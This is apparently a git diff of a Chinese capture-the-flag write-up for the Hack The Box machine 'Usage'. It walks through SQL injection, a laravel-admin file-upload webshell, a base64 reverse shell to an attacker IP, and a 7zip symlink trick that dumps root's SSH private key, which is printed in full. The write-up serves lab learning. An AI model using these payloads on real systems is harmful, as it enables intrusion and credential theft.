@@ -36,8 +36,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 test' or 1=1;-- -
 ```
 #### 是典型的 SQL 注入 (SQL Injection) payload 示例。它的含义是：
-```
 ![深邃的夜空有看不见的星星](images/091406.png)
+```
 test'：提前闭合了原本的字符串。
 or 1=1：构造了一个总是为真的条件。
 ;-- -：; 结束原来的 SQL 语句，-- - 是 SQL 中的注释符号，把后面的内容全部注释掉。
@@ -220,7 +220,7 @@ Session completed.
 ### 访问admin.usage.htb,用户/密码：admin/whatever1
 
 #### 在仪表板的Environment部分，我们看到正在使用Laravel 10.18.0和PHP 8.1.2。在在撰写本文时，这两个版本都没有公开的重大漏洞。然而，在Dependencies选项卡的右边，我们看到一些库和包在使用。值得注意的是，该网站使用了encore/laravel-admin 1.8.18，这似乎很容易受到攻击。
-![918空鸣918台风918忌日](images/091806.png)
+![918空鸣918台风918忌日](images/091807.png)
 https://nvd.nist.gov/vuln/detail/CVE-2023-24249
 #### laravel-admin v1.8.19 中的任意文件上传漏洞允许攻击者通过精心设计的 PHP 文件执行任意代码。
 https://flyd.uk/post/cve-2023-24249/
@@ -234,26 +234,28 @@ https://github.com/IDUZZEL/CVE-2023-24249-Exploit
 3. 直接访问上传的文件，执行PHP webshell。
 ```
 #### 首先，我们通过点击右上角的用户图标下拉导航菜单：
-![918空鸣918台风918忌日](images/091807.png)
+![918空鸣918台风918忌日](images/091808.png)
 #### 接下来，我们按下设置按钮，重定向到/admin/auth/Setting
 #### 在这里，我们可以上传一个新的头像图像。我们在机器上创建一个简单的php.shell
 ```
 [★]$ echo '<?php system($_GET["melo"]); ?>' > shell.php
 [★]$ mv shell.php shell.jpg
 ```
-![918空鸣918台风918忌日](images/091808.png)
-#### 在按下Submit之前，我们打开BurpSuite代理来拦截上传请求。点击Submit，直接联网
 ![918空鸣918台风918忌日](images/091809.png)
-#### 直接在raws上修改,只在shell.jpg后面加上.php；Forword；浏览器就有了：
+#### 在按下Submit之前，我们打开BurpSuite代理来拦截上传请求。点击Submit，直接联网
 ![918空鸣918台风918忌日](images/091810.png)
+#### 直接在raws上修改,只在shell.jpg后面加上.php；Forword；浏览器就有了：
+![918空鸣918台风918忌日](images/091811.png)
 #### 一旦我们转发请求，图像上传成功，我们可以复制链接到它所在的位置存储
 #### 需要在新的连接输入：http ://admin.usage.htb/uploads/images/shell.jpg.shell?melo=id
-![必须像正常一样生活](images/092001.png)
-
-
-
+![必须像正常一样生活](images/0920012.png)
+https://www.revshells.com/
+#### 给了个好用的工具
+![必须像正常一样生活](images/0920013.png)
+### 像刚刚一样插入payload，访问浏览器：(空格使用%20)
+```
 http://admin.usage.htb/uploads/images/shell.jpg.php?melo=echo%20c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQ5LzQ0NDQgMD4mMQ==%20%7C%20base64%20-d%20%7C%20bash
-
+```
 ```
 [★]$ nc -lvnp 4444
 listening on [any] 4444 ...
@@ -271,8 +273,6 @@ root:x:0:0:root:/root:/bin/bash
 dash:x:1000:1000:dash:/home/dash:/bin/bash
 xander:x:1001:1001::/home/xander:/bin/bash
 ```
-
-
 ```
 dash@usage:/var/www/html/project_admin/public/uploads/images$ ss -tlpn
 ss -tlpn
@@ -512,19 +512,97 @@ drwxrwxrwx 4 root xander 4096 Apr  3  2024 /var/www/html/
 ```
 #### 由于我们对目录具有RWX权限，因此可以利用usage_management工具读取任意文件，如根用户的私有SSH密钥
 ### Steps to Exploit 利用步骤
-#### 1. 导航到/var/www/html，创建一个名为@id_rsa的文件：@id_rsa文件（也称为listfile）告诉7zip id_rsa包含了一个文件列表压缩。但是，由于id_rsa将是根用户的私有SSH密钥的符号链接，所以7zip将读取并显示此文件的内容。创建@id_rsa确保7zip在id_rsa符号链接中查找文件列表。
+#### 在本地端口执行2条命令
 ```
-xander@usage:~$ cd /var/www/html
-xander@usage:/var/www/html$ touch @id_rsa
+[★]$ vi passwords
+3nc0d3d_pa$$w0rd
+[★]$ 7z a backup.zip @passwords
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs AMD EPYC 7543 32-Core Processor                 (A00F11),ASM,AES-NI)
+
+Scanning the drive:
+          
+WARNING: No more files
+3nc0d3d_pa$$w0rd
+
+0 files, 0 bytes
+
+Creating archive: backup.zip
+
+Items to compress: 0
+
+    
+Files read from disk: 0
+Archive size: 22 bytes (1 KiB)
+
+Scan WARNINGS for files and folders:
+
+3nc0d3d_pa$$w0rd : No more files
+----------------
+Scan WARNINGS: 1
 ```
-#### 2. 创建一个指向根用户SSH密钥的符号链接：这个名为id_rsa的符号链接指向我们想要读取的实际文件。当7zip试图读取id_rsa中的文件列表，它读取/root/.ssh/id_rsa。
+#### 在ssh端口执行
+```
+xander@usage:~$ touch -- @root.txt
+xander@usage:~$ touch -- @id_rsa
+xander@usage:~$ ln -s /root/root.txt root.txt
+xander@usage:~$ ln -s /root/.ssh/id_rsa id_rsa
+xander@usage:~$ ls
+@id_rsa  id_rsa  project_admin  @root.txt  root.txt  usage_blog
+xander@usage:~$ mv * /var/www/html/
 
-#### 3. 使用sudo运行该工具并选择Project Backup选项：此步骤触发7zip命令，该命令跟随符号链接并包含根文件中的SSH密钥。
+xander@usage:~$ cd /var/www/html/
+xander@usage:/var/www/html$ ls
+@id_rsa  id_rsa  project_admin  @root.txt  root.txt  usage_blog
+```
+```
+xander@usage:/var/www/html$ sudo -l
+```
+#### 下面已经拿到root.txt了
+```
+xander@usage:/var/www/html$ sudo /usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
+<SNIP>
+WARNING: No more files
+528b5b5aa283451e7548c5a09bcd0917
+<SNIP>
+Scan WARNINGS for files and folders:
 
-#### 我们看到私有SSH密钥确实包含在输出中，因此我们将其粘贴到本地机器上并正确格式化：
+-----BEGIN OPENSSH PRIVATE KEY----- : No more files
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
+QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
+QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
+AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
+H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
+-----END OPENSSH PRIVATE KEY----- : No more files
+528b5b5aa283451e7548c5a09bcd0917 : No more files
+----------------
+Scan WARNINGS: 8
+```
+### D 删除光标后的字符
+```
+[★]$ vi root
+[★]$ cat root
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
+QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
+AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
+H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
+-----END OPENSSH PRIVATE KEY-----
+
+[★]$ chmod 600 root
+[★]$ ssh -i root root@10.129.178.97
+cleanup.sh  root.txt  snap  usage_management.c
+```
 
 
-### 后记
+### 官方后记
 #### 为什么@id_rsa启用漏洞
 #### @id_rsa的存在欺骗7zip将id_rsa视为要压缩的文件列表。因为id_rsa是symlink到根的SSH密钥，7zip读取SSH密钥文件的内容，导致内容为包含在输出中。
 #### -snl标志的作用
@@ -533,3 +611,5 @@ xander@usage:/var/www/html$ touch @id_rsa
 #### snl标志的定义如下：
 -snl : store symbolic links as links
 #### 虽然有人可能会认为这将打破我们刚刚滥用的向量，但这个标志并不能阻止这种利用。相反，它确保符号链接本身存储在存档中，而不是它所指向的文件中。然而,当7zip读取id_rsa符号链接作为文件列表时，它仍然遵循符号链接读取目标文件的符号链接内容，该内容允许该漏洞工作。
+/dev/shm
+
